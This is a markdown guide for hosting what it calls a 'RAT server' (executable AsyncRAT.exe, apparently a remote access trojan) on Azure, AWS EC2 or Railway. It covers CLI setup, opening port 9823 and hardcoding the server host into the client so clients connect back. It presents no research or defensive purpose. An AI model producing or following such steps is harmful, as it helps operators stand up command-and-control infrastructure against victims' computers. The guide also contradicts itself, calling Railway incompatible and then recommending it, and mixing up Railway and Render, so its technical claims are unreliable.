# VB.NET RAT Server - Cloud Deployment Guide

## Overview
The current RAT server is built with **VB.NET on .NET Framework 4.8**, which is Windows-only and has limited cloud deployment options.

## Deployment Compatibility Matrix
| Platform | .NET Framework 4.8 | Linux Support | Cost | Recommendation |
|----------|-------------------|---------------|----|----------------|
| **Azure App Service** | ✅ Native | ❌ Windows only | 💰 $15-100/mo | **RECOMMENDED** |
| **AWS EC2** | ✅ Windows VM | ❌ Requires Windows | 💰 $10-50/mo | Good alternative |
| **Render** | ❌ Linux only | ✅ Linux | 💰 Free-$100/mo | NOT compatible |
| **Railway.app** | ❌ Linux only | ✅ Linux | 💰 Free-$25/mo | NOT compatible |
| **Docker/Heroku** | ❌ Requires Linux base | ✅ Linux | ❌ Discontinued | NOT available |

## ⭐ RECOMMENDED: Azure App Service

Azure App Service is the **only practical solution** for .NET Framework 4.8 deployment.

### Why Azure App Service?
- ✅ Native Windows Server support
- ✅ Built-in .NET Framework 4.8 runtime
- ✅ Automatic WebSocket support
- ✅ Git/GitHub direct deployment
- ✅ Free tier available (limited)
- ✅ TLS/HTTPS with free managed certificates
- ✅ Monitoring and diagnostics built-in

### Setup Steps (15 minutes)

**Step 1: Create Azure Account**
- Go to https://azure.microsoft.com/free
- Sign up (free tier includes $200 credits)
- Create free subscription

**Step 2: Create App Service**
```bash
# Via Azure CLI (or use Portal)
az group create --name rat-rg --location eastus
az appservice plan create --name rat-plan --resource-group rat-rg --is-linux false --sku F1
az webapp create --resource-group rat-rg --plan rat-plan --name rat-server-xyz --runtime 'DOTNETCORE|4.8'
```
OR via Portal:
1. Search "App Service" → Create
2. Runtime stack: `.NET Framework 4.8`
3. OS: `Windows`
4. SKU: `F1 Free` or `B1 Basic` ($12/month)

**Step 3: Enable WebSocket**
1. Go to Azure Portal → Your App Service
2. Settings → Configuration → General settings
3. Toggle **Web sockets** = ON
4. Click Save

**Step 4: Deploy from GitHub**
1. Deployment Center → GitHub
2. Authorize & select repository: `amakamerit62-design/db`
3. Branch: `main`
4. Azure auto-deploys on git push!

**Step 5: Get Public URL**
```
https://rat-server-xyz.azurewebsites.net
```
Convert to WebSocket:
```
ws://rat-server-xyz.azurewebsites.net:9823
wss://rat-server-xyz.azurewebsites.net:443  (with TLS)
```

**Step 6: Monitor Server**
```powershell
# View logs
az webapp log tail --resource-group rat-rg --name rat-server-xyz

# Or in Portal: Monitoring → Application Insights
```

---

## Alternative: AWS EC2 Windows Instance

If you prefer AWS:

**Setup:**
1. Launch EC2 instance: Windows Server 2022 with .NET Framework 4.8
2. RDP into instance
3. Clone GitHub repo: `git clone https://github.com/amakamerit62-design/db.git`
4. Build: `dotnet build Server/Server.vbproj -c Release`
5. Run: `Server\bin\Release\AsyncRAT.exe`
6. Expose port 9823 in Security Group
7. Get public IP: `ws://ec2-xx-xx-xx-xx.compute-1.amazonaws.com:9823`

**Cost:** $9-40/month depending on instance type

---

## ❌ NOT Recommended: Docker/Railway/Render

These platforms require Linux containers and don't support .NET Framework 4.8:
- Railway: Linux-only
- Render: Linux-only  
- Heroku: Discontinued
- Docker Hub: Would need Windows image (very expensive)

**To use these, you'd need to refactor to .NET 8 (4+ hours of work)**

### Path 3: Convert to .NET 8 (Long-term Solution)
Refactor project to .NET 8 for full cloud compatibility and modern deployment options.

**Pros:** Future-proof, works on any Linux platform, better performance
**Cons:** Requires refactoring (Forms → Console headless server)

**Effort:** ~4 hours (create headless server, remove UI dependencies)

## Immediate Action: Deploy on Railway.app

### Step 1: Prepare for Deployment
```powershell
cd "c:\Users\USER\Desktop\project\project synced"
dotnet build Server/Server.vbproj -c Release
```

### Step 2: Create Railway Account
- Go to https://railway.app/login
- Sign up with GitHub account
- Authorize repository access

### Step 3: Create New Project
- Click "New Project"
- Select "GitHub Repo"
- Choose: https://github.com/amakamerit62-design/db
- Authorize if needed

### Step 4: Configure Environment
Railway will auto-detect .NET project. Configure if needed:
- **Build Command**: `dotnet build Server/Server.vbproj -c Release`
- **Start Command**: `Server/bin/Release/AsyncRAT.exe`
- **Port**: 9823

### Step 5: Monitor Deployment
- Railway console shows real-time build/deployment logs
- Once deployed, you get public URL (e.g., `https://rat-service-xyz.up.railway.app`)

### Step 6: Update Client Configuration
Once you have the Render URL:
```vb
' In Client/Program.vb around line 50-52
Const SERVER_HOST = "your-service.up.railway.app"  ' From Render
Const SERVER_PORT = 9823
Const IS_WEBSOCKET = True
```

## WebSocket Configuration
Verify the server is listening on WebSocket:
- In Form1.vb (line 41), WebSocketServer is initialized
- Port: 9823 (configurable in Settings)
- Protocol: ws:// (insecure for testing) or wss:// (production with TLS)

## Testing Production Connection
```vb
' Client will connect via:
' ws://your-domain.up.railway.app:9823
' Verify in client_debug.log:
'   [CLIENT] WebSocket connected to ws://...
```

## Security Notes
- Current implementation uses **ws:// (unencrypted WebSocket)**
- For production, enable TLS: **wss://** (WebSocket over HTTPS)
- Railway provides free Let's Encrypt certificates for `.up.railway.app` domains
- Configure in Server code: Set secure=true in WebSocket connection

## Next Steps
1. **Immediate**: Deploy on Railway (5-10 min setup)
2. **Testing**: Update Client URL, rebuild, test connection
3. **Production**: Consider Azure App Service with TLS/wss://
4. **Long-term**: Convert to .NET 8 for maximum cloud flexibility

## Questions?
Refer to:
- Railway docs: https://railway.app/docs
- Azure docs: https://docs.microsoft.com/en-us/azure/app-service/
- WebSocket testing: Use browser DevTools or Python websocket-client

---
**Current Status:**
- ✅ WebSocket server built and working locally
- ✅ Client refactored to use WebSocket protocol  
- ⏳ Awaiting cloud deployment
- ⏳ Client URL configuration (post-deployment)
